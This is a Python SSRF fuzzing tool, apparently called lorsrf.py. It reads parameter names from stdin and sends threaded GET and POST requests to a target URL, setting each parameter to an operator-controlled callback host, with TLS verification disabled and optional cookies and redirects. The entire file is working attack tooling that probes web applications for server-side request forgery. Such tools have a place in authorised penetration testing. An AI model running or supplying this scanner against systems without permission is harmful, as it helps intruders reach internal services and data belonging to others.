#!/usr/bin/env python3

from threading import Thread
from queue import Queue
from optparse import OptionParser
import requests,sys


requests.packages.urllib3.disable_warnings()

def post_data(params):
    if params:
        prePostData = params.split("&")
        postData = {}
        for d in prePostData:
            p = d.split("=", 1)
            postData[p[0]] = p[1]
        return postData
    return {}


optp = OptionParser(add_help_option=False)
optp.add_option('-t',dest='target')
optp.add_option('-h','--help',dest='help',action='store_true')
optp.add_option('-s',dest='server')
optp.add_option('-c','--cookies',dest='cookies')
optp.add_option('--timeout',dest='timeout',type='int')
optp.add_option('-r','--allow_redirects',dest='redirect',action='store_true')
optp.add_option('--threads',dest='threads',type='int')
opts, args = optp.parse_args()
helper = f"""
Options:
	-h         | show help message and exit
	-s         | your server host
	-c         | add cookies
	-r         | allow redirects
	--threads  | add threads
	--timeout  | add timeout

Example:
	$ cat parameter.txt | python3 lorsrf.py -t http://example.com/ -s http://host
"""
if opts.help:
	print(helper)
	sys.exit()
if opts.threads:
	thr = opts.threads
else:
	thr = 10
if opts.target:
	link = opts.target
else:
	print(helper)
	sys.exit()
if opts.server:
	host = opts.server
else:
	print(helper)
	sys.exit()
if opts.cookies:
	c = post_data(opts.cookies)
else:
	c = None

if opts.redirect:
	redirect = True
else:
	redirect = False
if opts.timeout:
	timeout = opts.timeout
else:
	timeout = None
def req(link,cookie=None,redirect=None,timeout=None):
	try:
		r = requests.get(link,verify=False,allow_redirects=redirect,timeout=timeout,cookies=cookie)
		r2 = requests.post(link,verify=False,allow_redirects=redirect,timeout=timeout,cookies=cookie)
	finally:
		pass
q = Queue()
def threader():
	while True:
		item = q.get()
		print(item)
		req(item,redirect=redirect,timeout=timeout,cookie=c)
		q.task_done()

if __name__ == '__main__':
	for i in range(thr):
		p1 = Thread(target=threader)
		p1.daemon = True
		p1.start()
	for parameter in sys.stdin:
		parameter = parameter.rstrip()
		q.put(f'{link}?{parameter}={host}/{parameter}')
	q.join()